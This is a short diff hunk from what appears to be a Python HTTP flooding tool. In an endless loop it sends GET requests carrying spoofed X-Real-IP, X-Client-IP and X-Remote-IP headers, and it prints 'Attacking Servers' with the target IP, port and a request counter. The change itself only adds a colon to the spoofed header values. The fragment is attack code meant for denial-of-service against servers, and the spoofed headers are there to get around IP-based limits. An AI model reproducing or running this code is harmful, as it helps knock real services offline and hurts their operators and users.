@@ -67,9 +67,9 @@ while True:
                 "Referer": f"{res}",
                 "Cache-Control": "no-store, no-cache",
                 "Host": f"{ip}",
-                "X-Real-IP": f"{fip}",
-                "X-Client-IP": f"{fip}",
-                "X-Remote-IP": f"{fip}"
+                "X-Real-IP": f"{fip}:",
+                "X-Client-IP": f"{fip}:",
+                "X-Remote-IP": f"{fip}:"
             }
             response = requests.get(url, headers=headers)
             print(f"{red}Attacking {yellow}Servers{red} At{blue} {ip} {red}Port {blue}{port} : {white}", counter)
